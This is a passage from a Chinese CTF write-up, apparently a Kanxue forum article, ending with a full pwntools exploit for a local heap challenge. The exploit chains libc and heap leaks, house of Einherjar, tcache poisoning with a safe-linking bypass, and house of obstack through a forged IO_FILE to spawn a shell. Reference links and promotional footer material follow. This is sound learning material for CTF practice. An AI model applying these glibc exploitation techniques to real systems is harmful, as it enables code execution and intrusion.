dele(2)# free chunkCpayload4 = flat(        {0x18:1,0x20:0,0x28:1,0x30:0,0x38:p64(system),0x48:p64(bin_sh),0x50:1,0xd8:p64(_IO_obstack_jumps+0x20),0xe0:p64(heap_base + 0x740),            },            filler = '\x00'        )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()
```  
  
  
  
释放并申请chunkC，伪造IO_file，照着模板抄就行了，最后退出程序获取shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Cpo2XCpI7K1EE6m2ENYAAb1oibaEHs8lICCucJfQgLHCKG2jSDCu0cuc4kEQh410ffOA6icfKBc6uZGia6S3vcHecCKXs6wN0icPwJEWvA8LTho/640?wx_fmt=png&from=appmsg "")  
![]( "")  
![]( "")  
![]( "")  
## EXP  
  
```
from pwn import *context(log_level = 'debug', arch = 'amd64', os = 'linux')io=process("./vuln")libc = ELF("./libc.so.6")def add(index,size,date,weather,content):    io.sendlineafter("input your choice:",b'1')    io.sendlineafter("input index:",str(index).encode())    io.sendlineafter("size:",str(size).encode())    io.sendlineafter("date",date)    io.sendlineafter("weather:",weather)    io.sendlineafter("content:",content)def dele(index):    io.sendlineafter("input your choice:",b'2')    io.sendlineafter("input index:",str(index).encode())def show(index):    io.sendlineafter("input your choice:",b'3')    io.sendlineafter("input index:",str(index).encode())# ------------------泄露libc基址和heap基址----------------------------add(0,0x410,b'',b'',b'') # chunkAadd(1,0x40,b'',b'',b'') # chunkB，防止A和C合并add(2,0x420,b'',b'',b'') # chunkCadd(3,0x40,b'',b'',b'') # chunkD，防止C和top chunk合并dele(0)dele(2) # 此时unsorted bin为unsorted bin -> chunkC -> chunkAgdb.attach(io,"b *$rebase(0x17D4)") add(0,0x410,b'',b'',b'')show(0) #申请回chunkA并打印地址信息io.recvuntil(b"Date: ")libc_base = u64(io.recv(6).ljust(8,b"\x00")) - 0x21ac0a # 泄露libc基址log.success(hex(libc_base))io.recvuntil(b"Weather: ")heap_base = u64(io.recv(6).ljust(8,b"\x00")) - 0x70a # 泄露heap基址log.success(hex(heap_base))add(2,0x420,b'',b'',b'') # 申请回chunkC，防止被split# ------------------house of Einherjar和tcache poisoning----------------------------# 申请六个chunk，分别记为chunk1，chunk2。。chunk6for i in range(6):    add(4+i,0xe0,b'',b'',b'')'''伪造fake chunk，heap_base + 0x11e0是chunk7首地址+0x20的地址p64(heap_base + 0x11e0)*2是为了绕过if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \  malloc_printerr ("corrupted double-linked list");'''payload1 = p64(0) + p64(0x1e0) + p64(heap_base + 0x11e0)*2add(10,0xe0,b'',b'',payload1) # 申请chunk7add(11,0xe0,b'',b'',b'')# 申请chunk8add(12,0xe0,b'',b'',b'')# 申请chunk9for i in range(6):#依次free chunk1-chunk6，会放入tcache bin    dele(4+i)dele(11) # free chunk8，此时tcachebin满了payload2 = b'a'*0xe0 + p64(0x1e0)# 重新申请回chunk8，写prev_size，利用off by null覆写chunk9的P位# 因为off by null是写一个字节，所以chunk的size最好是0x100这种最后一个字节为0x00的，不然会报错，所以我之前申请的都是malloc(0xe0+16)add(11,0xe8,b'',b'',payload2)dele(11) # free chunk8，此时tcachebin又满了dele(12)# free chunk9，触发unlink，把chunk7，8，9合并成一个big chunk存入unsorted binsystem = libc_base + libc.symbols['system']bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))IO_list_all = libc_base + libc.symbols['_IO_list_all']io_list = (heap_base + 0x12d0) >> 12 ^ IO_list_all # 覆盖next指针用的，为了绕过safe-linking_IO_obstack_jumps = libc_base + 0x2173c0payload3 = b'a'*0xc8 + p64(0x101) + p64(io_list)add(13,0x2c0,b'',b'',payload3)# 申请回big chunk，覆写chunk8的next指针add(14,0xe0,b'',b'',b'')# 申请chunk8# -------------------------house of obstack------------------------------add(15,0xe0,p64(heap_base+0x740),b'',b'')# 申请我们指向的IO_list_all，这里heap_base+0x740写的是chunkC+0x20的地址dele(2)# free chunkCpayload4 = flat(        {0x18:1,0x20:0,0x28:1,0x30:0,0x38:p64(system),0x48:p64(bin_sh),0x50:1,0xd8:p64(_IO_obstack_jumps+0x20),0xe0:p64(heap_base + 0x740),            },            filler = '\x00'        )#申请回chunkC并伪造IO_fileadd(2,0x420,b'',b'',payload4)#退出程序触发利用链io.sendlineafter("input your choice:",b'4')io.interactive()
```  
  
#   
  
**参考链接**  
  
浅析tcache安全机制演进过程与绕过手法  
  
https://bbs.kanxue.com/thread-284325.htm  
  
  
Safe-Linking 机制的绕过  
  
https://zikh26.github.io/posts/501cca6.html  
  
  
浅析libc2.38版本及以前tcache安全机制演进过程与绕过手法  
  
https://zhuanlan.zhihu.com/p/12296343522  
  
  
一条新的glibc IO_FILE利用链：_IO_obstack_jumps利用分析  
  
https://tttang.com/archive/1845/  
  
  
HGAME2026_Writeup  
  
https://github.com/vidar-team/HGAME2026_Writeup  
  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Fv6AKzlMQkfRpWPNibEapJdgJRjBm0oadOfzpsicse2s4R01t9ABicibKcibFStzZDBIJibSXsplzhz23g/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：  
G0t1T  
  
https://bbs.kanxue.com/user-home-1002337.htm  
  
*本文为看雪论坛优秀文章，由   
G0t1T  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458605280&idx=3&sn=b862b079ee38c0e9607690b0574930dc&scene=21#wechat_redirect)  
  
  
# 往期推荐  
  
[逆向分析某手游基于异常的内存保护](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458607141&idx=1&sn=4bbcad4c23989173b834046f8852b3b4&scene=21#wechat_redirect)  
  
  
[解决Il2cppapi混淆，通杀DumpUnityCs文件](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606965&idx=1&sn=bf8987b5c86314edd0d5a4a5dd0189dd&scene=21#wechat_redirect)  
  
  
[记录一次Unity加固的探索与实现](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606979&idx=1&sn=e9fdec9d0ff5c4ede515dc302011b74a&scene=21#wechat_redirect)  
  
  
[DLINK路由器命令注入漏洞从1DAY到0DAY](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606963&idx=2&sn=c7265f29dd183dd2b5789254e8d3d979&scene=21#wechat_redirect)  
  
  
[量子安全 quantum ctf Global Hyperlink Zone Hack the box](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606863&idx=1&sn=01fd80bfa67b7c7b26254022f0d11e81&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
